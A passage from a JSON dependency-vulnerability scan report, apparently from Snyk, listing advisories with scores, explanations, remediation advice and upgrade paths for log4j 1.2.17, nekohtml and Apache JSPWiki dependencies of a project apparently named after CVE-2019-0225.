      "cvssScore": 9.8,
      "functions": [
        {
          "version": [
            "[0,]"
          ],
          "functionId": {
            "filePath": "org/apache/log4j/net/SocketServer.java",
            "className": "SocketServer",
            "functionName": "main"
          }
        }
      ],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "log4j:log4j",
      "references": [
        {
          "url": "https://lists.apache.org/thread.html/eea03d504b36e8f870e8321d908e1def1addda16adda04327fe7c125%40%3Cdev.logging.apache.org%3E",
          "title": "Apache Security Advisory"
        },
        {
          "url": "https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html",
          "title": "Atlassian Patch"
        },
        {
          "url": "https://0xsapra.github.io/website/CVE-2019-17571",
          "title": "PoC"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "critical",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 9.8,
          "modificationTime": "2022-07-26T01:11:37.621986Z"
        },
        {
          "assigner": "SUSE",
          "severity": "critical",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 9.8,
          "modificationTime": "2022-05-03T23:36:31.140776Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "critical",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 9.8,
          "modificationTime": "2022-10-26T20:30:52.296974Z"
        }
      ],
      "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. Included in Log4j 1.2 is a SocketServer class that is vulnerable to deserialization of untrusted data which can be exploited to remotely execute arbitrary code when combined with a deserialization gadget when listening to untrusted network traffic for log data.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Security Advisory](https://lists.apache.org/thread.html/eea03d504b36e8f870e8321d908e1def1addda16adda04327fe7c125%40%3Cdev.logging.apache.org%3E)\n- [Atlassian Patch](https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html)\n- [PoC](https://0xsapra.github.io/website/CVE-2019-17571)\n",
      "epssDetails": {
        "percentile": "0.99947",
        "probability": "0.97467",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2019-17571"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-2qrg-x229-3v8q"
        ]
      },
      "packageName": "log4j:log4j",
      "proprietary": false,
      "creationTime": "2020-06-18T15:47:31.144561Z",
      "functions_new": [
        {
          "version": [
            "[0,]"
          ],
          "functionId": {
            "className": "org.apache.log4j.net.SocketServer",
            "functionName": "main"
          }
        }
      ],
      "alternativeIds": [],
      "disclosureTime": "2019-12-22T09:33:11Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "log4j",
        "artifactId": "log4j"
      },
      "publicationTime": "2020-06-19T09:33:01Z",
      "modificationTime": "2023-09-28T10:33:14.290033Z",
      "socialTrendAlert": false,
      "severityWithCritical": "critical",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
        "log4j:log4j@1.2.17"
      ],
      "upgradePath": [
        false,
        "org.apache.jspwiki:jspwiki-main@2.11.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.17"
    },
    {
      "id": "SNYK-JAVA-NETSOURCEFORGENEKOHTML-2621454",
      "title": "Denial of Service (DoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
      "credit": [
        "이형관 (windshock)"
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "net.sourceforge.nekohtml:nekohtml",
      "references": [
        {
          "url": "https://github.com/sparklemotion/nekohtml/commit/a800fce3b079def130ed42a408ff1d09f89e773d",
          "title": "GitHub Commit"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "Red Hat",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-03-26T14:47:52.054472Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-07-26T01:11:19.792610Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) due to an uncaught `java.lang.OutOfMemoryError` exception when parsing ill-formed HTML markup.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nA fix was pushed into the `master` branch but not yet published.\n## References\n- [GitHub Commit](https://github.com/sparklemotion/nekohtml/commit/a800fce3b079def130ed42a408ff1d09f89e773d)\n",
      "epssDetails": {
        "percentile": "0.46292",
        "probability": "0.00127",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-24839"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-9849-p7jc-9rmv"
        ]
      },
      "packageName": "net.sourceforge.nekohtml:nekohtml",
      "proprietary": false,
      "creationTime": "2022-04-12T11:45:16.731969Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-04-12T11:40:23Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "net.sourceforge.nekohtml",
        "artifactId": "nekohtml"
      },
      "publicationTime": "2022-04-12T14:21:53.906896Z",
      "modificationTime": "2023-03-26T14:47:52.054472Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
        "net.sourceforge.nekohtml:nekohtml@1.9.22"
      ],
      "upgradePath": [
        false,
        "org.apache.jspwiki:jspwiki-main@2.11.3"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "net.sourceforge.nekohtml:nekohtml",
      "version": "1.9.22"
    },
    {
      "id": "SNYK-JAVA-NETSOURCEFORGENEKOHTML-2774754",
      "title": "Memory Allocation with Excessive Size Value",
      "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "net.sourceforge.nekohtml:nekohtml",
      "references": [
        {
          "url": "https://htmlunit.sourceforge.io/changes-report.html%23a2.27",
          "title": "Releases"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-10-29T01:10:33.676290Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Memory Allocation with Excessive Size Value via a crafted Processing Instruction (PI) input.\n## Remediation\nThere is no fixed version for `net.sourceforge.nekohtml:nekohtml`.\n## References\n- [Releases](https://htmlunit.sourceforge.io/changes-report.html#a2.27)\n",
      "epssDetails": {
        "percentile": "0.36345",
        "probability": "0.00088",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-28366"
        ],
        "CWE": [
          "CWE-789"
        ]
      },
      "packageName": "net.sourceforge.nekohtml:nekohtml",
      "proprietary": false,
      "creationTime": "2022-04-24T14:07:34.794547Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-04-24T13:26:47Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "net.sourceforge.nekohtml",
        "artifactId": "nekohtml"
      },
      "publicationTime": "2022-04-24T15:16:32Z",
      "modificationTime": "2022-10-29T01:10:33.676290Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
        "net.sourceforge.nekohtml:nekohtml@1.9.22"
      ],
      "upgradePath": [
        false,
        "org.apache.jspwiki:jspwiki-main@2.11.3"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "net.sourceforge.nekohtml:nekohtml",
      "version": "1.9.22"
    },
    {
      "id": "SNYK-JAVA-NETSOURCEFORGENEKOHTML-2803036",
      "title": "Heap-based Buffer Overflow",
      "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 4,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "net.sourceforge.nekohtml:nekohtml",
      "references": [
        {
          "url": "https://github.com/HtmlUnit/htmlunit-neko/commit/9d2aecd69223469e40c12ca3edddda09009110cc",
          "title": "GitHub Commit"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-05-05T01:10:56.807574Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Heap-based Buffer Overflow via a crafted Processing Instruction (PI) input.\n## Remediation\nThere is no fixed version for `net.sourceforge.nekohtml:nekohtml`.\n## References\n- [GitHub Commit](https://github.com/HtmlUnit/htmlunit-neko/commit/9d2aecd69223469e40c12ca3edddda09009110cc)\n",
      "epssDetails": {
        "percentile": "0.30603",
        "probability": "0.00075",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-29546"
        ],
        "CWE": [
          "CWE-122"
        ],
        "GHSA": [
          "GHSA-6jmm-mp6w-4rrg"
        ]
      },
      "packageName": "net.sourceforge.nekohtml:nekohtml",
      "proprietary": false,
      "creationTime": "2022-04-25T11:36:53.287581Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-04-25T11:31:46Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "net.sourceforge.nekohtml",
        "artifactId": "nekohtml"
      },
      "publicationTime": "2022-04-25T15:16:24.219695Z",
      "modificationTime": "2022-05-05T01:10:56.807574Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2",
        "net.sourceforge.nekohtml:nekohtml@1.9.22"
      ],
      "upgradePath": [
        false,
        "org.apache.jspwiki:jspwiki-main@2.11.3"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "net.sourceforge.nekohtml:nekohtml",
      "version": "1.9.22"
    },
    {
      "id": "SNYK-JAVA-ORGAPACHEJSPWIKI-174750",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
      "credit": [
        "Jegatheesh A"
      ],
      "semver": {
        "vulnerable": [
          "[,2.11.0.M4)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.11.0.M4"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 6.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "org.apache.jspwiki:jspwiki-main",
      "references": [
        {
          "url": "https://github.com/apache/jspwiki/commit/87c89f0405d6b31fc165358ce5d5bc4536e32a8a",
          "title": "GitHub Commit"
        },
        {
          "url": "https://jspwiki-wiki.apache.org/Wiki.jsp?page=CVE-2019-10077",
          "title": "JSPWiki CVE Details"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2022-01-03T17:53:36.959093Z"
        }
      ],
      "description": "## Overview\n[org.apache.jspwiki:jspwiki-main](https://jspwiki.apache.org) is a main release jar for Apache JSPWiki engine.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS). A carefully crafted InterWiki link could trigger an XSS vulnerability due to lack of output encoding within `JSPWikiMarkupParser.java`.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.apache.jspwiki:jspwiki-main` to version 2.11.0.M4 or higher.\n## References\n- [GitHub Commit](https://github.com/apache/jspwiki/commit/87c89f0405d6b31fc165358ce5d5bc4536e32a8a)\n- [JSPWiki CVE Details](https://jspwiki-wiki.apache.org/Wiki.jsp?page=CVE-2019-10077)\n",
      "epssDetails": {
        "percentile": "0.69172",
        "probability": "0.00381",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2019-10077"
        ],
        "CWE": [
          "CWE-79"
        ]
      },
      "packageName": "org.apache.jspwiki:jspwiki-main",
      "proprietary": false,
      "creationTime": "2019-05-21T11:44:12.031257Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2019-05-20T22:06:15Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "org.apache.jspwiki",
        "artifactId": "jspwiki-main"
      },
      "publicationTime": "2019-05-20T22:06:15Z",
      "modificationTime": "2022-01-03T17:53:36.959093Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2"
      ],
      "upgradePath": [
        false,
        "org.apache.jspwiki:jspwiki-main@2.11.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.apache.jspwiki:jspwiki-main",
      "version": "2.11.0.M2"
    },
    {
      "id": "SNYK-JAVA-ORGAPACHEJSPWIKI-174755",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
      "credit": [
        "RunningSnail"
      ],
      "semver": {
        "vulnerable": [
          "[,2.11.0.M4)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.11.0.M4"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 6.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "org.apache.jspwiki:jspwiki-main",
      "references": [
        {
          "url": "https://github.com/apache/jspwiki/commit/46cd981dfb431730da3f9249f5db858aacf11e52",
          "title": "GitHub Commit"
        },
        {
          "url": "https://jspwiki-wiki.apache.org/Wiki.jsp?page=CVE-2019-10078",
          "title": "JSPWiki CVE Details"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
          "cvssV3BaseScore": 6.1,
          "modificationTime": "2022-01-03T17:53:35.609969Z"
        }
      ],
      "description": "## Overview\n[org.apache.jspwiki:jspwiki-main](https://jspwiki.apache.org) is a main release jar for Apache JSPWiki engine.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS). A carefully crafted plugin link invocation could trigger an XSS vulnerability due to no escaping being conducted for `title` and `rootnamewithin` parameter within `ReferredPagesPlugin.java`.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.apache.jspwiki:jspwiki-main` to version 2.11.0.M4 or higher.\n## References\n- [GitHub Commit](https://github.com/apache/jspwiki/commit/46cd981dfb431730da3f9249f5db858aacf11e52)\n- [JSPWiki CVE Details](https://jspwiki-wiki.apache.org/Wiki.jsp?page=CVE-2019-10078)\n",
      "epssDetails": {
        "percentile": "0.73971",
        "probability": "0.00536",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2019-10078"
        ],
        "CWE": [
          "CWE-79"
        ]
      },
      "packageName": "org.apache.jspwiki:jspwiki-main",
      "proprietary": false,
      "creationTime": "2019-05-21T11:52:37.547659Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2019-05-20T22:06:15Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "org.apache.jspwiki",
        "artifactId": "jspwiki-main"
      },
      "publicationTime": "2019-05-21T14:10:30Z",
      "modificationTime": "2022-01-03T17:53:35.609969Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
        "org.apache.jspwiki:jspwiki-main@2.11.0.M2"
      ],
      "upgradePath": [
        false,
        "org.apache.jspwiki:jspwiki-main@2.11.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.apache.jspwiki:jspwiki-main",
      "version": "2.11.0.M2"
    },
    {
      "id": "SNYK-JAVA-ORGAPACHEJSPWIKI-174829",
      "title": "Cross-site Scripting (XSS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L",
      "credit": [
        "brushed"
      ],
      "semver": {
        "vulnerable": [
          "[,2.11.0-M4)"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [
        "2.11.0-M4"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 5.6,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "org.apache.jspwiki:jspwiki-main",
      "references": [
        {
          "url": "https://issues.apache.org/jira/browse/JSPWIKI-1109",
          "title": "Apache Jira Issue"
        },
        {
          "url": "https://github.com/apache/jspwiki/commit/46cd981dfb431730da3f9249f5db858aacf11e52",
          "title": "GitHub Commit"
        }
      ],
      "cvssDetails": [],
      "description": "## Overview\n[org.apache.jspwiki:jspwiki-main](https://jspwiki.apache.org) is a main release jar for Apache JSPWiki engine.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS). Illegal characters (<...>) of the `ReferredPagesPlugin` are not properly escaped in the output of the plugin.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.apache.jspwiki:jspwiki-main` to version 2.11.0-M4 or higher.\n## References\n- [Apache Jira Issue](https://issues.apache.org/jira/browse/JSPWIKI-1109)\n- [GitHub Commit](https://github.com/apache/jspwiki/commit/46cd981dfb431730da3f9249f5db858aacf11e52)\n",
      "epssDetails": null,
      "identifiers": {
        "CVE": [],
        "CWE": [
          "CWE-79"
        ]
      },
      "packageName": "org.apache.jspwiki:jspwiki-main",
      "proprietary": false,
      "creationTime": "2019-05-30T14:32:03.037943Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2019-04-24T16:51:17Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "org.apache.jspwiki",
        "artifactId": "jspwiki-main"
      },
      "publicationTime": "2019-05-30T08:21:44Z",
      "modificationTime": "2020-12-14T14:41:25.447285Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2019-0225@1.0.0",
